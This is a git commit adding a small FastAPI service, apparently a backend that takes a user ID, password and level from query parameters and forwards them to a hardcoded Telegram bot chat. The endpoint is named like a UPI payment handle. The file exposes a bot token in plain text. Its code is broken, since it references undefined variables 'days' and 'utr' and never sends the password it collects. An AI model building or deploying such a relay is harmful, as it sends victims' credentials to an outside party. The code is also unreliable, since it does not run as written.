5481c0e2e7279f303e3a5f55696301c000d82b6e
rahulr2xji-creator <rahulr2xji@gmail.com>
2026-05-20 09:04:43 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,24 @@
+from fastapi import FastAPI, Query
+import requests
+
+app = FastAPI(title="Telegram Flash API")
+
+BOT_TOKEN = "8986683875:AAF9iLn5kUNe2DYbRU0ugliF3m8rK6xClrY"
+CHAT_ID = "7326248826"
+
+@app.get("/")
+def home():
+    return {"status": "API Running 🚀"}
+
+# MAIN ENDPOINT
+@app.get("/pal772480@fam")
+def send(uid: str = Query(...), password: str = Query(...), level: str = Query(...)):
+
+    text = f"UID: {uid}\nDAYS: {days}\nUTR: {utr}"
+
+    requests.get(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        params={"chat_id": CHAT_ID, "text": text}
+    )
+
+    return {"status": "request send successfully "}
